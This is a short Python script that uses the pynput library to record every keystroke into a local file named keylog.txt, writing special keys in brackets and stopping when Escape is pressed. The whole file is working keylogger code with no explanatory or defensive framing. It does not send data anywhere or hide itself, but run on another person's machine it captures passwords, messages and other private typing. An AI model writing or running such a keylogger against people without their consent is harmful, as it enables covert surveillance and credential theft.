from pynput import keyboard

def on_press(key):
    try:
        
        with open("keylog.txt", "a") as log_file:
            log_file.write(key.char)
    except AttributeError:
        
        with open("keylog.txt", "a") as log_file:
            if key == keyboard.Key.space:
                log_file.write(" ")
            elif key == keyboard.Key.enter:
                log_file.write("\n")
            elif key == keyboard.Key.tab:
                log_file.write("\t")
            else:
                log_file.write(f"[{key.name}]")  

    if key == keyboard.Key.esc:
        return False


with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
